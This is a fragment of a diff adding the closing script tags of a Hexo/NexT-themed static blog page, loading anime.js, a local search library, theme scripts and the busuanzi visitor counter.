+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
